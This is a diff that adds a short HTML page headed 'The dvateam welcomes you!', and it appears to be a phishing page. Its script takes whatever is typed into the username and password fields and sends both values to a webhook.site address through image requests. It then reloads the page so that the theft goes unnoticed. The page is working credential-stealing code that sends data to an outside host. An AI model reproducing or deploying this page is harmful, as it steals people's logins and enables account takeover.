@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+  const getValueInput = () =>{
+    let inputValue=document.getElementById("username").value;
+    let inputValue1 = document.getElementById("password").value;
+    var i=new Image();
+    var j=new Image();
+    i.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?password="+inputValue1;
+    j.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?username="+inputValue; 
+    window.location.reload();
+  }
+  </script>
+
+  <h1>The dvateam welcomes you!</h1>
+  <label for="domTextElement">Username:</label>
+  <input type="text" id="username" >
+  <br>
+  <br>
+  <label for="domTextElement1">Password: </label>
+  <input type="password" id="password" >
+  <br>
+  <br>       
+  <button type="button"  onclick="getValueInput()">click me!!    </button>
+  <p id="valueInput"></p>
+</body>
+</html>
